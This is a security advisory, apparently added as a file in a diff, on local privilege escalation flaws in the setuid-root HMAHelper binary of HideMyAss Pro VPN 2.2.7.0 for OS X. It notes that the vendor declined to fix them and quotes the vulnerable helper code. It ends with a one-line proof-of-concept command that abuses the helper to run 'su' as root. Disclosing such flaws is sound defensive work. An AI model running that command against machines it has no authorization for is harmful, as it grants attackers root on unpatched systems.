@@ -1,0 +1,45 @@
+Source: https://www.securify.nl/advisory/SFY20170402/multiple_local_privilege_escalation_vulnerabilities_in_hidemyass_pro_vpn_client_v2_x_for_os_x.html
+
+Abstract
+Multiple local privilege escalation vulnerabilities were found in the helper binary HMAHelper that ships with HideMyAss Pro VPN for OS X. The helper is installed setuid root and responsible for loading Kernel Extensions (kext) and managing VPN firewall rules. These issues can be leveraged by a local attacker to gain elevated (root) privileges.
+
+
+Tested versions:
+This issue was tested on HMA Pro VPN version 2.2.7.0 for OS X
+
+
+Fix:
+HMA Support has reported that this issue will not be fixed. Version 2.2.7.0. is still available for download and was earlier this year also available in the Mac App Store. It seems that this version is still available for older versions of OS X (OS X 10.7 - 10.11).
+
+It should be noted the latest version of HMA Pro VPN for OS X (version 3.3.0.3) is vulnerable to a similar local privilege escalation issue that is also not fixed at the time of writing.
+
+
+Introduction:
+HideMyAss is a popular VPN service that allows users to hide their identity and browse anonymously online. HideMyAss also provides applications to setup the VPN connections, including a client for OS X. It was discovered that version 2.x of HMA Pro VPN for OS X is affected by multiple local privilege escalation vulnerabilities.
+
+
+Details:
+The helper binary HMAHelper that ships with HMA Pro VPN for OS X is installed as setuid root. The helper has the ability to execute several commands as root, including running kernal extentions (kext) but also enabling and disabling security firewall rules.
+
+Although disabling the firewall is dangerous enough, it was found that the helper is affected by multiple local privilege escalation vulnerabilities. Taking the FirewallDisable rule as an example, the code snippet below shows that there is no limit to which executable can be executed allowing a local user (or malware) to run any executable as root.
+
+Privax.OSX.HMA.Helper.FirewallManager 
+private static void FirewallDisableSelected(string path, string args, string processNames)
+{
+   using (Process process = new Process())
+   {
+      ProcessStartInfo startInfo = process.StartInfo;
+      startInfo.FileName = "/usr/bin/sudo";
+      startInfo.Arguments = string.Format("\"{0}\" \"{1}\" \"{2}\"", (object) path, (object) args, (object) processNames);
+      startInfo.CreateNoWindow = true;
+      startInfo.UseShellExecute = false;
+      PermissionsManager.PermissionsSet(PermissionsManager.UIDRoot, PermissionsManager.GIDWheel);
+      process.Start();
+      process.WaitForExit();
+   }
+}
+
+
+Proof of concept:
+
+/Applications/HMA\!\ Pro\ VPN.app/Contents/Resources/Applications/HMAHelper.app/Contents/MacOS/HMAHelper --sib-firewall-enable 'su' ''
